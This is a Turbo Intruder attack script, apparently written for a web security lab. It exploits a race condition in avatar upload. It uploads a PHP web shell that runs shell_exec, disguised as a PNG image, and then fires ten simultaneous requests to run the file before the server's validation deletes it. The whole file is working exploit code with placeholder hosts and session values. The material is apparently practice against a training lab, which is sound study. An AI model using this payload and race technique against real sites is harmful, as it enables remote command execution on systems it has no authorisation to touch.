# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    request2 = '''GET /files/avatars/Pikachu.php HTTP/1.1
Host: example
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=example
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 07 Dec 2021 15:30:40 GMT
If-None-Match: "137-5d2900e4ddbd4"

    '''

    request1='''POST /my-account/avatar HTTP/1.1
Host: example
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------11455024252746072685587969773
Content-Length: 789
Connection: close
Referer: https://example
Cookie: session=example
Upgrade-Insecure-Requests: 1

-----------------------------11455024252746072685587969773
Content-Disposition: form-data; name="avatar"; filename="Pikachu.php"
Content-Type: image/png

<?php 
    //$command = $_GET["cmd"];
    //echo $command;
    $command = "id";
    echo shell_exec($command);
?> 
-----------------------------11455024252746072685587969773
Content-Disposition: form-data; name="user"

foobar
-----------------------------11455024252746072685587969773
Content-Disposition: form-data; name="csrf"

kCnQzMX3xb3eG25pLFcNWJobVc53P93k
-----------------------------11455024252746072685587969773--

'''
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,)

    #engine.queue(request1, gate="race1")
    engine.queue(request1, gate="race1")
    for k in range(10):
        engine.queue(request2, gate="race1")

        
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
